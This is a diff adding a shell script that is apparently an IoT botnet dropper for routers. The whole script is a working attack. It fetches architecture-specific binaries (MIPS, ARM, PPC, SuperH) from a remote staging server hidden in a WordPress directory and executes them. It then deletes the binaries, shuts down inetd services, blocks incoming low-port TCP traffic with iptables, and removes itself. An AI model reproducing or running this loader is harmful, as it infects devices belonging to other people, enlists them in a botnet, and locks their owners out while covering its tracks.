@@ -1,0 +1,49 @@
+#!/bin/sh
+# THIS SCRIPT DOWNLOAD THE BINARIES INTO ROUTER.
+# UPLOAD GETBINARIES.SH IN YOUR HTTPD.
+
+# YOUR HTTPD SERVER:
+REFERENCE_HTTP="http://aviation.alomarco.com/wp-includes/SimplePie/Decode/HTML/.../"
+
+# NAME OF BINARIES:
+REFERENCE_MIPSEL="r"
+REFERENCE_MIPS="x"
+REFERENCE_SUPERH="y"
+REFERENCE_ARM="g"
+REFERENCE_PPC="i"
+
+echo "nameserver 8.8.8.8" >> /etc/resolv.conf
+echo "nameserver 8.8.4.4" >> /etc/resolv.conf
+
+rm -fr /var/run/${REFERENCE_MIPSEL} \
+	/var/run/${REFERENCE_MIPS} \
+	/var/run/${REFERENCE_SUPERH} \
+	/var/run/${REFERENCE_ARM} \
+	/var/run/${REFERENCE_PPC}
+
+wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} -P /var/run && chmod +x /var/run/${REFERENCE_MIPSEL} && /var/run/${REFERENCE_MIPSEL}
+wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPS} -P /var/run && chmod +x /var/run/${REFERENCE_MIPS} && /var/run/${REFERENCE_MIPS}
+wget -c ${REFERENCE_HTTP}/${REFERENCE_ARM} -P /var/run && chmod +x /var/run/${REFERENCE_ARM} && /var/run/${REFERENCE_ARM}
+wget -c ${REFERENCE_HTTP}/${REFERENCE_PPC} -P /var/run && chmod +x /var/run/${REFERENCE_PPC} && /var/run/${REFERENCE_PPC}
+wget -c ${REFERENCE_HTTP}/${REFERENCE_SUPERH} -P /var/run && chmod +x /var/run/${REFERENCE_SUPERH} && /var/run/${REFERENCE_SUPERH}
+
+busybox wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} -P /var/run && chmod +x /var/run/${REFERENCE_MIPSEL} && /var/run/${REFERENCE_MIPSEL}
+busybox wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPS} -P /var/run && chmod +x /var/run/${REFERENCE_MIPS} && /var/run/${REFERENCE_MIPS}
+busybox wget -c ${REFERENCE_HTTP}/${REFERENCE_ARM} -P /var/run && chmod +x /var/run/${REFERENCE_ARM} && /var/run/${REFERENCE_ARM}
+busybox wget -c ${REFERENCE_HTTP}/${REFERENCE_PPC} -P /var/run && chmod +x /var/run/${REFERENCE_PPC} && /var/run/${REFERENCE_PPC}
+busybox wget -c ${REFERENCE_HTTP}/${REFERENCE_SUPERH} -P /var/run && chmod +x /var/run/${REFERENCE_SUPERH} && /var/run/${REFERENCE_SUPERH}
+
+sleep 3;
+
+rm -fr /var/run/${REFERENCE_MIPSEL} \
+	/var/run/${REFERENCE_MIPS} \
+	/var/run/${REFERENCE_SUPERH} \
+	/var/run/${REFERENCE_ARM} \
+	/var/run/${REFERENCE_PPC}
+
+/etc/init.d/inet stop
+/etc/init.d/inetd stop
+/etc/init.d/S50inetd stop
+
+iptables -I INPUT 1 -p tcp --dport 1:1024 -s ! 127.0.0.1 -j DROP
+rm -fr /var/run/getbinaries.sh
